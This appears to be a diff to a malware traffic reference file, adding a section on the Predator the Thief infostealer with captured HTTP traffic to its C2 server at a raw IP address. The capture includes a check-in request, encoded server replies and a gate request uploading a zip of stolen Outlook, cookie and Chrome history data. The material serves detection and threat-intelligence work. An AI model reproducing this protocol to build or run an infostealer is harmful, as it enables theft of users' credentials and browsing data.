@@ -107,6 +107,71 @@ flag on "40 00 00 00 17" pattern:
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")
 
+#### Predator the Thief
+~~~
+POST /api/check.get HTTP/1.1
+Content-Type: text/html
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Host: 95.215.205.56
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 09 Oct 2019 20:05:42 GMT
+Server: Apache
+Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 132
+Keep-Alive: timeout=10, max=100
+Connection: Keep-Alive
+Content-Type: text/plain; charset=utf-8
+
+nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73q
+
+HTTP/1.1 200 OK
+Date: Wed, 09 Oct 2019 20:05:42 GMT
+Server: Apache
+Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 132
+Keep-Alive: timeout=10, max=100
+Connection: Keep-Alive
+Content-Type: text/plain; charset=utf-8
+
+nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73qPOST /api/gate.get?p1=2&p2=5&p3=0&p4=2&p5=0&p6=0&p7=0&p8=0&p9=0&p10=udh8T1P6VQh1ZF9DgIniQjWRSWBTqqYq5k2u HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------228
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
+Host: 95.215.205.56
+Content-Length: 6028
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404
+
+-----------------------------228
+Content-Disposition: form-data; name="file"; filename="s7q3q0u1v7q3q0u1v7.zip"
+Content-Type: application/octet-stream
+
+PK..........IO................Outlook/UT
+...K.].K.].K.]PK..........IOo...?...F.......Outlook/Outlook.txtUT
+...K.].K.].K.]s.M...R...K.t(./.K..e..
+H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
+...K.].K.].K.]PK..........IO................Cookies/UT
+...K.].K.].K.]PK..........IO................History/UT
+...K.].K.].K.]PK..........IO................Other/UT
+...K.].K.].K.]PK..........IOa.qZ............History/Chrome_0.txtUT
+...K.].K.].K.].V[k.8.~..?.............B...>..,{D4.V....?..e..4M.M...`....s...O....3..b%....0.
+7.'_.;s6.H}6.kZ.Fz........i...aZ...".".v.P.x>PR.[.D...$Q..."...%
+f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
+.
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")
+
 #### TA505 Loader:
 ~~~
 POST /2021 HTTP/1.1
